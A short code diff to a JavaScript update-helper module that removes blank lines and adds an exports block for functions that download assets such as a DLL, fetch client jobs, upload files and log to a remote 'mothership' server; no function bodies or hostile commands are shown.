@@ -1,6 +1,5 @@
 const helper = require("./adobeupdate.helper.js");
 
-
 /*
     status: response.status,
     statusText: response.statusText,
@@ -329,7 +328,6 @@ async function download_pcmon() {
         await retrieve_asset("pcmon.dll", null, systemconfig.pcmondir);
 }
 
-
 async function download_pspcmon() {
     helper.logmsg("starting");
 
@@ -488,3 +486,11 @@ async function logmsgMothership(msg, isevent = false, jobcode) {
 function logEventMothership(event_code, jobcode) {
     return logmsgMothership(event_code, true, jobcode);
 }
+
+module.exports = {
+    makeGetRequest,
+    logEventMothership,
+    logmsgMothership,
+    retrieveClientJob,
+    upload_file,
+};
